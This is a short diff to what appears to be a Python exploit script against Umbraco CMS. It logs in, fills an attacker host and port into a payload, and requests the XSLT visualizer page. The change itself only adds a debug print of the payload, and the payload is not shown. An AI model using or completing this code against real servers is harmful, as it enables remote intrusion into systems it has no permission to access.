@@ -47,7 +47,8 @@ class Payload:
         r2 = s.post(url_login,json=loginfo);
         
         payload = payload.replace("{host}", self.host).replace("{port}", self.port)
-        
+        print(payload) 
+
         url_xslt = http_host + "/umbraco/developer/Xslt/xsltVisualize.aspx";
         r3 = s.get(url_xslt);
         
